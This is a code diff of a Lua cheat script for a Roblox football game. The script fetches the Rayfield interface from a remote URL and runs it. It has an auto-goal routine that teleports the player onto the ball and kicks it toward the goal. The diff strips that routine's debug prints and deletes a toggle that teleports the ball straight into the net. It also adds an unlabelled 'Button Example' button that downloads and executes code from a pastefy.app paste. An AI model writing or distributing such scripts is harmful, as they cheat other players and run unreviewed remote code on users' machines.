@@ -1,5 +1,4 @@
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-
 local Services = {
     Players = game:GetService("Players"),
     RunService = game:GetService("RunService"),
@@ -601,21 +600,17 @@ OPTab:CreateToggle({
             task.spawn(function()
                 -- Function to handle the auto goal logic
                 local function autoGoalLogic()
-					print("autoGoalLogic called (Team:", player.Team.Name, ")")
 					if player.Team.Name == "Visitor" then
-						print("Player is on Visitor team, returning.")
 						return
 					end
 
 					local character = player.Character
 					if not character or not character:FindFirstChild("HumanoidRootPart") then
-						print("Character or HumanoidRootPart not found.")
 						return
 					end
 					local humanoidrootpart = character:WaitForChild("HumanoidRootPart")
 					local humanoid = character:FindFirstChildOfClass("Humanoid")
 					if not humanoid then
-						print("Humanoid not found.")
 						return
 					end
 					local v = character:FindFirstChild("Values") or character:WaitForChild("Values", 5)
@@ -623,26 +618,18 @@ OPTab:CreateToggle({
 					local g = {["Away"] = "Away", ["Home"] = "Home"}
 
 					local targetGoal = g[player.Team.Name]
-					print("Target Goal:", targetGoal)
 
 					if targetGoal then
 						if h and h.Value then
-							print("Player has the ball, kicking.")
 							Goto(humanoidrootpart.CFrame * CFrame.new(0, 50, 0), targetGoal, "Kick")
 						else
 							local b = workspace:FindFirstChild("Football")
-							print("Found Football:", b)
 							if b then
 								local targetCFrame = b.CFrame * CFrame.new(0, 3.5, 0)
-								print("Target CFrame for Football:", targetCFrame)
 								humanoidrootpart.CFrame = targetCFrame -- Quay lại đặt CFrame trực tiếp
-								print("HumanoidRootPart CFrame set to:", targetCFrame)
 							else
-								print("Football does not exist, trying to find closest player with ball.")
 								local t = ClosestCharacter(character)
-								print("Closest character:", t)
 								local fb = t and t:FindFirstChild("Football") or (t and t:WaitForChild("Football", 5))
-								print("Football of closest character:", fb)
 								if fb then Goto(fb.CFrame, targetGoal, "Slide") end
 							end
 						end
@@ -729,54 +716,14 @@ OPTab:CreateToggle({
     end,
 })
 
-OPTab:CreateToggle({
-    Name = "Ultimate Autogoal (no money)",
-    CurrentValue = false,
-    Flag = "UltimateAutoGoal",
-    Callback = function(Value)
-        getgenv().Settings = getgenv().Settings or {}
-        getgenv().Settings.UltimateAutoGoal = Value
-
-        if Value then
-            task.spawn(function()
-                while getgenv().Settings.UltimateAutoGoal do
-                    local player = game.Players.LocalPlayer
-                    local teamName = player.Team and player.Team.Name
-
-                    if teamName == "Home" or teamName == "Away" then
-                        -- Define goal position based on team
-                        local targetPosition
-                        if teamName == "Away" then
-                            targetPosition = Vector3.new(178.6785125732422, 11.167295455932617, -48.65309143066406)
-                        elseif teamName == "Home" then
-                            targetPosition = Vector3.new(-250.26145935058594, 11.365068435668945, -51.581138610839844)
-                        end
-
-                        -- Find the ball
-                        local ball = workspace:FindFirstChild("Football") or workspace:WaitForChild("Football", 5)
-
-                        -- Teleport the ball
-                        if ball and targetPosition then
-                            if ball.Anchored then
-                                ball.Anchored = false
-                            end
-
-                            ball.CFrame = CFrame.new(targetPosition)
-
-                            -- Retry in case it fails
-                            task.wait(0.1)
-                            if (ball.Position - targetPosition).Magnitude > 3 then
-                                ball.CFrame = CFrame.new(targetPosition)
-                            end
-                        end
-                    end
-
-                    task.wait(0.5) -- Repeat every 0.5s
-                end
-            end)
-        end
-    end,
+local Button = Tab:CreateButton({
+   Name = "Button Example",
+   Callback = function()
+	loadstring(game:HttpGet("https://pastefy.app/Lwux93kr/raw"))()
+   end,
 })
+
+
 
 -- Input: save power value to getgenv() on change
 local Input = OPTab:CreateInput({ 
